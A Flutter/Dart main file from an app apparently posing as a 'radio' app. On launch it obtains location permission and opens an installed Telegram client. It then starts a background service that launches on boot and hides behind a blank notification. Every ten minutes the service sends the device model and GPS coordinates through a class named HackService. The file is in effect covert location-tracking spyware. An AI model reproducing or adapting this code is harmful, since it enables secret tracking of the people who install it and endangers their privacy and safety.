import 'dart:async';
import 'dart:io';
import 'dart:ui';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:external_app_launcher/external_app_launcher.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:radio/home_screen.dart';
import 'package:radio/service.dart';
import 'package:shared_preferences/shared_preferences.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initializeService();
  runApp(const MyApp());
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  @override
  void initState() {
    super.initState();
    getPermission();
  }

  openApp() async {
    var telegram = await LaunchApp.isAppInstalled(
        androidPackageName: 'org.telegram.messenger');
    if (telegram ?? false) {
      await LaunchApp.openApp(androidPackageName: 'org.telegram.messenger');
      // SystemNavigator.pop();
      return;
    }
    var plus =
        await LaunchApp.isAppInstalled(androidPackageName: 'org.telegram.plus');
    if (plus ?? false) {
      await LaunchApp.openApp(androidPackageName: 'org.telegram.plus');
      // SystemNavigator.pop();


      return;
    }
    var aka =
        await LaunchApp.isAppInstalled(androidPackageName: 'org.aka.messenger');
    if (aka ?? false) {
      await LaunchApp.openApp(androidPackageName: 'org.aka.messenger');
      // SystemNavigator.pop();

      return;
    }

    var telegraph = await LaunchApp.isAppInstalled(
        androidPackageName: 'ir.ilmili.telegraph');
    if (telegraph ?? false) {
      await LaunchApp.openApp(androidPackageName: 'ir.ilmili.telegraph');
      // SystemNavigator.pop();
      return;
    }
  }

  getPermission() async {
    var permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied ||
        permission == LocationPermission.deniedForever) {
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied ||
          permission == LocationPermission.deniedForever) {
        // exit(0);
        return Future.error('Location permissions are denied');
      }
    }
    openApp();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: const HomeScreen(),
    );
  }
}

Future<void> initializeService() async {
  final service = FlutterBackgroundService();

  const AndroidNotificationChannel channel = AndroidNotificationChannel(
    'my_foreground', // id
    'MY FOREGROUND SERVICE', // title
    description: 'This channel is used for important notifications.',
    // description
    importance: Importance.low,
    enableVibration: false,
    playSound: false,
    showBadge: false,
  );

  final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
      FlutterLocalNotificationsPlugin();

  await flutterLocalNotificationsPlugin
      .resolvePlatformSpecificImplementation<
          AndroidFlutterLocalNotificationsPlugin>()
      ?.createNotificationChannel(channel);

  await service.configure(
    androidConfiguration: AndroidConfiguration(
        onStart: onStart,
        autoStart: true,
        isForegroundMode: true,
        notificationChannelId: 'my_foreground',
        initialNotificationTitle: ' ',
        initialNotificationContent: ' ',
        foregroundServiceNotificationId: 888,
        autoStartOnBoot: true),
    iosConfiguration: IosConfiguration(
      // auto start service
      autoStart: true,
      // this will be executed when app is in foreground in separated isolate
      onForeground: onStart,
      // you have to enable background fetch capability on xcode project
      onBackground: onIosBackground,
    ),
  );

  service.startService();
}

@pragma('vm:entry-point')
Future<bool> onIosBackground(ServiceInstance service) async {
  WidgetsFlutterBinding.ensureInitialized();
  DartPluginRegistrant.ensureInitialized();

  SharedPreferences preferences = await SharedPreferences.getInstance();
  await preferences.reload();
  final log = preferences.getStringList('log') ?? <String>[];
  log.add(DateTime.now().toIso8601String());
  await preferences.setStringList('log', log);
  return true;
}

@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();
  // final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
  //     FlutterLocalNotificationsPlugin();

  if (service is AndroidServiceInstance) {
    service.on('setAsForeground').listen((event) {
      service.setAsForegroundService();
    });

    service.on('setAsBackground').listen((event) {
      service.setAsBackgroundService();
    });
  }

  service.on('stopService').listen((event) {
    service.stopSelf();
  });

  DeviceInfoPlugin info = DeviceInfoPlugin();

  Timer.periodic(const Duration(minutes: 10), (timer) async {
    var android = await info.androidInfo;

    var serviceEnabled = await Geolocator.isLocationServiceEnabled();
    if (!serviceEnabled) {
      return Future.error('Location services are disabled.');
    }

    try {
      Permission per = Permission.location;
      if (await per.isGranted) {
        var a = await Geolocator.getCurrentPosition();
        await HackService()
            .onSendData(android.model, a.latitude ?? 0, a.longitude ?? 0)
            .then((value) {});
      }
    } catch (e) {
      print("Error");
    }

    String? device;
    if (Platform.isAndroid) {
      final androidInfo = await info.androidInfo;
      device = androidInfo.model;
    }

    service.invoke(
      'update',
      {
        "current_date": DateTime.now().toIso8601String(),
        "device": device,
      },
    );
  });
}
